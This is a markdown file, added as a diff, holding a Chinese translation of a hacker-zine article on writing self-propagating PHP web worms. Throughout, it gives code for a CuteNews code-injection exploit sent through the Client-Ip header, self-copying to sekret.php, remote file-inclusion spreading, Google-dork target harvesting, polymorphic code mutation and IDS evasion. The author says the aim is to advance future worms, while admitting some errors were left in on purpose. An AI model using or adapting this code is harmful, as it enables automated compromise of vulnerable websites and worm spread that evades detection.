@@ -1,0 +1,176 @@
+
+
+# web 蠕虫编写艺术
+
+> 原文：[`www.pediy.com/kssd/pediy10/91029.html`](https://www.pediy.com/kssd/pediy10/91029.html)
+
+标题：web 蠕虫编写艺术  
+  
+作者：未知  
+  
+译者：riusksk(泉哥)  
+  
+来源：国外著名黑客杂志《hack in zine》  
+  
+   
+  
+＊导言       
+  
+＊自动化     
+  
+＊搜集目标  
+  
+＊绕过 IDS,多态性和通讯         
+  
+＊结语       
+  
+\===导言===                                 
+  
+   本文以一些未公开的 WEB 蠕虫为例，这些蠕虫可通过 PHP 漏洞脚本进行自我传播。该蠕虫叫 World Cant Wait ，在 11.2 被公布在成千上万个信息公告栏和博客上，以此反对布什政权。原先它利用的是一个私有漏洞，就是最近曝出的关于 CuteNews 1.4 的 php 代码执行漏洞。这个蠕虫可自动寻找目标，并自我繁殖。在蠕虫病毒肆虐的同时，街上的人们还高喊着抗议口号。在此我并不打算冒着触犯法律的风险而去破坏一些系统，而是将通过阐述这项技术，并发布相关的模块代码，以此来推动未来 PHP 蠕虫的发展。  
+虽然本文中故意留有一些错误，并且仅提供部分代码，但凭此你也是可以写出一个具备一定破坏力的蠕虫病毒的，我们这样做的目的主要是为了防止媒体把我们描述成一些具有暴力和破坏力的黑客。编写蠕虫的优美与才智是体现在编写代码本身，而非它可以黑掉多少系统。现在让我们一起去探索其中的奥秘吧，同时请记住：代码无罪！  
+  
+\===自动化===                           
+  
+挖掘漏洞并编写一个可自动搜集目标和利用的引擎。WEB 漏洞具有可预测性，通过搜索引擎可很容易地做到，而且通过构造一系列的 HTTP requests 即可实现自动化攻击。  
+  
+while ($stop == false) {  
+ $list = gather\_targets();  
+ for ($i=0;$i<count($list);$i++) {  
+ echo " \[x\] targetting $list\[$i\]...\\n";  
+ if (!is\_infected($list\[$i\])) infect($list\[$i\]);  
+ }  
+ $stop = true;  
+}  
+  
+为了让 WEB 蠕虫进行自我传播，你需要将利用过程自动化，这可以通过使用 PHP socket 函数与 web server 建立连接，并发送 http 数据。下面的函数演示了如何使用 PHP 脚本来连接服务器，发送数据并返回响应信息：      
+  
+function make\_request($domain, $packet) {  
+ $fp = @fsockopen($domain, 80, $errno, $errstr, 10);  
+ if (!$fp) return false;  
+ fwrite($fp, $packet);  
+ while (!feof($fp)) $text.= fgets($fp);  
+ fclose($fp);  
+}                                                          
+  
+接下来的工作就仅仅只是构造一个适合的 HTTP request，以利用漏洞,并进行自我复制以感染系统。当有人对文章发表评论时，CuteNews 便将信息写入 data/flood.db.php 文件中。通过 Client-Ip HTTP header 传输数据，你就可以向这个文件注入 PHP 代码。  
+  
+$packet = str\_replace("\\n","\\n\\r",   
+"POST  
+$location/example2.php?subaction=showcomments&id=1128188313&archive=&start\_from=  
+&ucat=& HTTP/1.1  
+Accept: \*/\*\\r\\nAccept-Language: en  
+Accept-Encoding: gzip, deflate  
+Client-Ip: <?php echo \\"arbitrary php code to be executed!!\\"; ?>  
+User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/412.6  
+(KHTML, like Gecko) Safari/412.2  
+Content-Type: application/x-www-form-urlencoded  
+Content-Length: 107  
+Connection: close  
+Host: $domain  
+  
+name=haxitup&mail=&comments=j00+haxed+%3Alaughing%3A&submit=Add+My+Comment&  
+subaction=addcomment&ucat=&show=  
+  
+";                               
+  
+ 如果我们创建了这些请求，那么就可以通过 Client-Ip 将 PHP 代码写入到 flood.db.php 文件中，然后我们就可以通过一个正规的 GET 请求来执行代码了。既然可以将 PHP 代码执行的过程自动化，那么我们就可以开始着手准备去如何编写病毒代码，以实现其自我繁殖并植入 payload 的功能。下面的例子将复制整个蠕虫代码到漏洞服务器上的 sekret.php 文件中，以备运行。你可以在 Client-Ip 未端添加一些 payload,通过运行 sekret.php 使其在 news.txt 顶端中添加一新标题，让每个存在漏洞的 CuteNews 站点都发表一新闻帖。  
+  
+$source = str\_replace("\\$", "\\\\\\$",str\_replace("\\"", "\\\\\\"",str\_replace("\\\\",  
+"\\\\\\\\",file\_get\_contents($\_SERVER\['PHP\_SELF'\]))));  
+...  
+Client-Ip: <?php \\$fp=fopen(\\"sekret.php\\", \\"w\\");fwrite(\\$fp,  
+\\"$source\\");fclose(\\$fp); ?>\\r\\n ...  
+...  
+for ($i=0;$i<2;$i++) { $bob = make\_request($domain, $packet); }  
+make\_request($domain, "GET $location/data/flood.db.php HTTP/1.1\\r\\nHost:  
+$domain\\r\\nConnection: close\\r\\n\\r\\n");  
+其它感染方式：PHP 文件包含  
+  
+关于将 PHP 文件包含漏洞的处理自动化的技术也并不是很难，通常我们粗劣写出来的 PHP 脚本都普遍含有<?php include $page; ?>这样一段代码，该代码存在远程 PHP 代码执行漏洞，我们可以将一小段 PHP 代码作为 GET 变量'page'的值，然后通过 URL 进行传输。这样我们的通过 URL 来发送 HTTP GET request 以使其在其它服务器上自行运行，蠕虫就可以在 WEB 的根目录下的一些地方进行自我复制了。  
+  
+$fp = fopen("sekret.txt", "w");  
+fwrite($fp, file\_get\_contents($\_SERVER\['PHP\_SELF'\]));  
+fclose($fp);  
+$url = $\_SERVER\['SCRIPT\_URI'\];  
+make\_request($domain, "GET /test.php?path=$url HTTP/1.1\\r\\nHost:  
+$domain\\r\\nConnection: close\\r\\n\\r\\n");  
+  
+其它感染方式：SQL  
+  
+其它感染方式：JavaScript / XSS  
+  
+\===搜集目标===  
+  
+ 在 worm 开发期间，最为明智的做法是将实际的利用代码与目标搜集代码相分离开来。你可以在自己的机器上或局域网内，使用类似下列的代码进行测试：  
+  
+function gather\_targets() {  
+ return array("http://localhost/cutenews");  
+}  
+基于 web 蠕虫的意图，通过搜索引擎去寻找潜在的目标是很有必要的。你可以很容易地写出一些请求，并通过 URLs 让网站执行特定软件。这可以通过网页收集代码来产生一组包含可被 worm 感染的目标数组，以此实现其自动化。  
+  
+ $search = array("inurl:flood.db.php", "\\"powered by cutenews v1.3\\"",  
+"\\"/cutenews/remote\_headlines.php\\"", "\\"powered by CuteNews\\" \\"2003..2005  
+CutePHP\\"",  "inurl:\\"/newsarchive.php?archive\\"");  
+ $query = $search\[rand(0, count($search)-1)\];  
+   
+通过构造 HTTP requests，你就可以从搜索引擎中获得搜索结果，然后从返回的网址中寻找合适的目标。  
+  
+$fp = fsockopen("google.com", "80");  
+ fwrite($fp, "GET /search?q=" . urlencode($query) .  
+"&sourceid=mozilla-search&start=0&start=0&ie=utf-8&oe=utf-8&client=firefox-a&rls  
+\=org.mozilla:en-US:official HTTP/1.1\\r\\n  
+Host: www.google.com\\r\\n  
+User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.8)  
+Gecko/20050511/1.0.4\\r\\n  
+Accept:  
+text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,  
+image/png,\*/\*;q=0.5\\r\\n  
+Accept-Language: en-us,en;q=0.5\\r\\n  
+Accept-Encoding: gzip,deflate\\r\\n  
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,\*;q=0.7\\r\\n  
+Connection: close\\r\\n\\r\\n");  
+ while (!feof($fp) AND (strpos($text, "2005 Google") === false)) {  
+ $text.= fgets($fp);  
+ }  
+ fclose($fp);  
+   
+ while (!(strpos($text, "<a href=\\"http://") === false)) {  
+ $starttext = substr($text, strpos($text, "<a href=\\"http://") + 9);  
+ $thenumber = substr($starttext, 0, strpos($starttext, "\\""));  
+ $text = str\_replace("<a href=\\"$thenumber\\">", "x", $text);     
+ if (strpos($thenumber, "google") === false) $vuln\[\] = $thenumber;  
+ }    
+ print\_r($vuln);  
+  
+\===绕过 IDS,多态性和通讯===  
+  
+你可以通过查找和替换以上代码，以调整上面写得比较匆忙的代码，使其便于用在每个新的迭代蠕虫病毒中。PHP 与其它语言相似，有提供一些可互换，并可产生相同结果的函数别名。现在考虑一下，通过添加外部的垃圾代码以混淆文件大小和通过对代码进行编码的相似之处。除了改变程序中的变量名之外，还可以将数字及字符串以不同的方式来表达。  
+  
+$random++;              ->        $random+= -2 + 3;  
+$start = "go";          ->        $start = chr(103) . chr(111);  
+$num = count($result);  ->        $num = sizeof($result);  
+下面的代码是改于 29a 病毒杂志上公布的变量名变形的源代码：  
+  
+<?php  
+$changevars=array('changevars', 'content', 'newvars', 'counti','countj',  
+'trash');  
+srand((double)microtime()\*1000000);  
+$content=fread(fopen(\_\_FILE\_\_,'r'),filesize(\_\_FILE\_\_));  
+$counti=0;  
+while($changevars\[$counti\]) {  
+ $content=str\_replace($changevars\[++$counti\], trash('',0), $content);  
+}  
+fwrite(fopen(\_\_FILE\_\_,'w'),$content);  
+  
+function trash($newvar, $countj) {  
+ do { $newvar.=chr(rand(97,122)); } while (++$countj<rand(5,15));  
+ return $newvar;  
+}  
+?>  
+将 http request 中的数据集随机化，以使其具备不可预测性。通过选择一个随机的 user-agent，以使其看起来像真实的 users。或者你也可以调整实际的 POST 数据，使其不能在每个表单名中使用相同的名称（比如上面的 cutenews 一例）。  
+  
+如果蠕虫病毒依靠像 google 这样的搜索引擎来搜集目标，那么就应该考虑将请求多样化了，以减少被加入黑名单而被查杀的可能性。inurl（译注：google 的搜索命令）可以用来搜索很多的页面，但 intitle 也是相当不错的。将 http request 中的 user-agent 随机化，或者结合多个搜索引擎来混杂它们，以此延长 worm 的生命期。过去和将来的迭代蠕虫病毒的通讯开发方式主要置力于 attacked boxes,蠕虫病毒分散的通讯方式也可以帮助 worm 自动变形，通过发现（fuzzing）新的 exploits 或者反馈新的攻击方式就可以使其自动变形。  
+  
+结语                             
+  
+     在通过 Php 脚本漏洞传播的 WEB 蠕虫病毒的编写世界中,World Cant Wait 作为一个简单的 proof-of-concept 而被制造出来。虽然蠕虫代码不能摧毁系统（上面的代码甚至未经修改就不能运行），但这个 PoC 可用于改造成各种 payload。之前脚本蠕虫的雏形只是用来搜集 jumpbox,捕获密码，或者 DDoS 主流系统，然而实际上也有些人是通过它来修补脆弱软件中的安全漏洞；也有人正蕴酿着如何在各留言板，博客和信息栏上大肆灌水，以此轰炸站点和操作 google 的网站收录及其它 spidering 系统。这种情况可能是永无休止的，但真正的天才是体现在创造力上。大部分人对像编写蠕虫病毒这样的高级编程很感兴趣，主要是因为开发出可自动搜集目标并对其攻击的高效代码具有一定的技术挑战。没有任何更为可行和完美的编程训练，可以比编写蠕虫病毒如此地更为有效和复杂。即使制造病毒在国人的眼光中是违法的，但人们对这项技术的兴趣依然长盛不衰，并且已经持续了几十年，并将一直成为黑客文化中的一部分，同时以一种安全可靠的方式来发展它们。
